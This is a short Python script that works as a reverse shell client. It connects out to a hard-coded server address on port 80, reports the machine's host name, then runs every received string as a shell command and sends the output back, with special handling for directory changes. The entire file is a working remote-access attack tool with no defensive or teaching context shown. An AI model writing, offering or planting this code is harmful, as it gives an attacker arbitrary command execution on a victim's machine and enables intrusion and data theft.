from subprocess import getoutput
from os import chdir
import socket

SERVER_IP = "192.168.1.11"
SERVER_PORT = 80
HOSTNAME = socket.gethostname()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_IP, SERVER_PORT))

s.sendall(f"[{HOSTNAME}]: Connected\n".encode("utf-8"))

while True:
    data = s.recv(1024)

    if not data:
        break

    data = data.decode()

    if data[0:2] == "cd":
        data = data[3:].replace('\n', '')

        try:
            chdir(data)
            cmd = getoutput("cd") + '\n'
            s.sendall(cmd.encode("utf-8"))
            
        except OSError:
            pass


    else:
        output = getoutput(data) + '\n'
        s.sendall(output.encode("utf-8"))

s.close()
